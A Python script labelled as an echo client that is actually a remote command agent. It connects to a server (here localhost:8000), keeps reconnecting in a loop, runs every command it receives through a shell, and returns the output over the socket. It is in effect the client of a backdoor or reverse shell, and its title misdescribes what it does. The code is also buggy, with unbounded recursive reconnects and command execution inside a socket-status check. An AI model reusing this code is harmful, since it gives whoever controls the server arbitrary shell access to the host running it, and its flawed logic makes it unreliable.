# Echo client program
import socket
import time
import logging
import threading
import subprocess
import ast


logger = logging.getLogger(__name__)


HOST = "localhost"  # The remote host
PORT = 8000

s: socket = None


def connect():
    time.sleep(5)
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print(f"Connected Succesfully {HOST}, {PORT}")
    isConnected = True
    # data = s.recv(1024)
    # print('Received', repr(data))


def is_socket_closed(sock: socket.socket) -> bool:
    try:
        # this will try to read bytes without blocking and also without removing them from buffer (peek only)
        data = sock.recv(1024)
        runComands(data)
        if len(data) == 0:
            return True
    except BlockingIOError:
        return False  # socket is open and reading from it would block
    except ConnectionResetError:
        return True  # socket was closed for some other reason
    except Exception as e:
        logger.exception(
            f"unexpected exception when checking if a socket is closed {e}"
        )
        return False
    return False




def runComands(commands):
    global s
    parsed_list = ast.literal_eval(commands.decode("utf-8"))
    for command in parsed_list:
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        
        if s is not None:
            print("Data Sent")
            s.send(result.stdout.encode('utf-8'))


def reconnect():
    try:
        time.sleep(5)
        global s
        if s == None:
            print("Trying to connect")
            connect()
        elif is_socket_closed(s) == True:
            print("Trying to reconnect")
            s = None
            reconnect()
            print("Reconnection succesfull")
        elif is_socket_closed(s) == False:
            print(f"{s} from is_socket_closed == False")
            print("Connection is alive with the server")
            connect()
    except ConnectionRefusedError:
        s = None
        reconnect()
    except WindowsError:
        s = None
        reconnect()


def reconnectThread():
    threading.Thread(target=reconnect).run()


# The same port as used by the server
while True:
    reconnect()
